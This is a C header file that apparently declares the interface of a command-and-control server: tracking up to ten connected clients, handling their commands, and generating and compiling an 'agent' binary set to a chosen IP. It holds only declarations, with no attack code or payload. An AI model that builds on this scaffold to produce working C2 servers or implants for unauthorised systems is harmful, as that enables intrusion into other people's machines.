#ifndef C2_H
#define C2_H

#include <netinet/in.h>
#include <pthread.h>

// Maximum number of clients that the server can handle simultaneously.
#define MAX_CLIENTS 10

/**
 * Structure to represent a connected client.
 * @param socket The client's socket descriptor.
 * @param address The client's network address information.
 */
typedef struct {
    int socket;
    struct sockaddr_in address;
} Client;

// Array to store connected clients.
extern Client clients[MAX_CLIENTS];

// Mutex to ensure thread-safe operations on the clients array.
extern pthread_mutex_t clients_mutex;

/**
 * Adds a new client to the clients array.
 * @param new_socket The socket descriptor of the new client.
 * @param client_addr The network address of the new client.
 * @return The index at which the client was added, or -1 if the array is full.
 */
int add_client(int new_socket, struct sockaddr_in client_addr);

/**
 * Lists all currently connected clients.
 */
void list_clients();

/**
 * Removes a client from the clients array.
 * @param client_index The index of the client to remove.
 */
void remove_client(int client_index);

/**
 * Checks for client timeouts and removes inactive clients.
 */
void check_timeout();

/**
 * Handles communication with an individual client.
 * @param client_socket The client's socket descriptor.
 */
void client_handler(int client_socket);

/**
 * Checks if a string is empty or contains only whitespace characters.
 * @param str The string to check.
 * @return 1 if the string is empty or whitespace, 0 otherwise.
 */
int is_empty_or_whitespace(const char *str);

/**
 * Updates the agent file with necessary configurations or data.
 */
void update_agent_file();

/**
 * Compiles the agent source code into an executable.
 */
void compile_agent();

/**
 * Generates an agent file with the specified IP configuration.
 */
void generate_agent_with_ip();

/**
 * Displays help information regarding server commands.
 */
void help_command();

/**
 * Handles input from the server side, such as commands.
 */
void handle_client_input();

/**
 * Main entry point of the server application.
 * @return Exit status code.
 */
int main();

#endif
